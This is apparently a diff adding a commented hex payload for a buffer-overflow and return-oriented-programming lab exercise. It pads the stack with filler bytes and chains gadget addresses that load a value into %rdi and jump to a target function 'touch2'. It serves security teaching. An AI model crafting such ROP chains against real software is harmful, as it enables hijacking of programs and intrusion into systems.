@@ -1,0 +1,9 @@
+c3 c3 c3 c3 c3 c3 c3 c3  /* useless spacing */
+c3 c3 c3 c3 c3 c3 c3 c3  /* useless spacing */
+c3 c3 c3 c3 c3 c3 c3 c3  /* useless spacing */
+c3 c3 c3 c3 c3 c3 c3 c3  /* useless spacing */
+c3 c3 c3 c3 c3 c3 c3 c3  /* useless spacing */
+cc 19 40 00 00 00 00 00  /* jump to execute popq %rax */
+fa 97 b9 59 00 00 00 00  /* The value popped to %rax */
+a2 19 40 00 00 00 00 00  /* jump to execute movq %rax, %rdi */
+ec 17 40 00 00 00 00 00  /* jump to touch2 with arg in %rdi */
